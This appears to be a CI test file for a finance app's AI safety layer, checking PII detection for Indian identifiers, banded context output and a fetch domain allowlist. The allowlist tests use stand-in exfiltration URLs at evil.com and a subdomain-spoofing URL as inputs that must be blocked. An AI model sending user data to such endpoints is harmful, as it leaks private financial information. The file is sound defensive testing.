// CI HARD GATE — never skip, never weaken.
// This test suite blocks deployment if any PII leaks through buildUserContext()
// or if fetch() is called to a non-permitted domain.
//
// Permitted external domains: api.anthropic.com, api.mfapi.in, query.yahoofinance.com

import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { buildUserContext } from '@/core/ai-safety/buildUserContext';
import { ALLOWED_DOMAINS, isDomainAllowed, PII_PATTERNS, scanForPii } from '@/core/ai-safety/piiScanner';

// ─── PII pattern tests ────────────────────────────────────────────────────────

describe('PII_PATTERNS — detection accuracy', () => {
  it('detects a PAN number', () => {
    expect(scanForPii('ABCDE1234F').hasPii).toBe(true);
  });

  it('detects an Aadhaar number', () => {
    expect(scanForPii('1234 5678 9012').hasPii).toBe(true);
    expect(scanForPii('123456789012').hasPii).toBe(true);
  });

  it('detects an Indian mobile number', () => {
    expect(scanForPii('9876543210').hasPii).toBe(true);
    expect(scanForPii('8123456789').hasPii).toBe(true);
  });

  it('detects an email address', () => {
    expect(scanForPii('user@example.com').hasPii).toBe(true);
  });

  it('detects an IFSC code', () => {
    expect(scanForPii('HDFC0001234').hasPii).toBe(true);
  });

  it('does not flag clean financial text', () => {
    const clean = JSON.stringify({
      netWorthBand: '₹10L–₹11L',
      assetClasses: ['mf', 'fd'],
      savingsRatePct: 30
    });
    expect(scanForPii(clean).hasPii).toBe(false);
  });
});

// ─── buildUserContext PII gate ────────────────────────────────────────────────

describe('buildUserContext — PII gate', () => {
  it('returns a context object without throwing', () => {
    expect(() => buildUserContext()).not.toThrow();
  });

  it('output contains no PII patterns', () => {
    const ctx = buildUserContext();
    const serialised = JSON.stringify(ctx);
    const result = scanForPii(serialised);
    expect(result.hasPii).toBe(false);
  });

  it('output contains no raw amounts — only banded strings', () => {
    const ctx = buildUserContext();
    // netWorthBand must be a string, not a raw number
    expect(typeof ctx.netWorthBand).toBe('string');
    expect(ctx.netWorthBand).toMatch(/[₹KLCr]/);
  });

  it('output contains no asset names — only asset classes', () => {
    const ctx = buildUserContext();
    // assetClasses must be generic types, not fund names or stock tickers
    const allowedClasses = ['mf', 'stock', 'fd', 'nps', 'ppf', 'gold', 'crypto', 'other'];
    for (const c of ctx.assetClasses) {
      expect(allowedClasses).toContain(c);
    }
  });

  it('serialised output passes all PII_PATTERNS checks', () => {
    const ctx = buildUserContext('expenses');
    const serialised = JSON.stringify(ctx);
    for (const [name, pattern] of Object.entries(PII_PATTERNS)) {
      expect(pattern.test(serialised), `Pattern "${name}" matched in context`).toBe(false);
    }
  });
});

// ─── Domain allowlist gate ────────────────────────────────────────────────────

describe('domain allowlist', () => {
  it('permits all three allowed domains', () => {
    for (const domain of ALLOWED_DOMAINS) {
      expect(isDomainAllowed(`https://${domain}/v1/messages`)).toBe(true);
    }
  });

  it('blocks any other domain', () => {
    const blocked = [
      'https://example.com',
      'https://google.com',
      'https://api.openai.com',
      'https://evil.com/steal?data=yes',
      'https://notapi.anthropic.com.evil.com' // subdomain spoofing attempt
    ];
    for (const url of blocked) {
      expect(isDomainAllowed(url)).toBe(false);
    }
  });

  it('fetch is intercepted and blocked for non-allowed domains', async () => {
    const fetchSpy = vi.spyOn(globalThis, 'fetch').mockImplementation(async (input) => {
      const url = typeof input === 'string' ? input : input instanceof URL ? input.href : input.url;
      if (!isDomainAllowed(url)) {
        throw new Error(`BLOCKED: fetch to non-allowed domain: ${url}`);
      }
      return new Response('{}', { status: 200 });
    });

    await expect(fetch('https://evil.com/exfiltrate')).rejects.toThrow('BLOCKED');
    fetchSpy.mockRestore();
  });
});

// ─── Console PII guard ────────────────────────────────────────────────────────

describe('console output — PII guard', () => {
  const loggedLines: string[] = [];
  const originalLog = console.log;
  const originalWarn = console.warn;
  const originalError = console.error;

  beforeEach(() => {
    console.log = (...args: unknown[]) => loggedLines.push(args.map(String).join(' '));
    console.warn = (...args: unknown[]) => loggedLines.push(args.map(String).join(' '));
    console.error = (...args: unknown[]) => loggedLines.push(args.map(String).join(' '));
  });

  afterEach(() => {
    console.log = originalLog;
    console.warn = originalWarn;
    console.error = originalError;
    loggedLines.length = 0;
  });

  it('buildUserContext does not log PII to console', () => {
    buildUserContext();
    const allOutput = loggedLines.join('\n');
    const result = scanForPii(allOutput);
    expect(result.hasPii).toBe(false);
  });
});
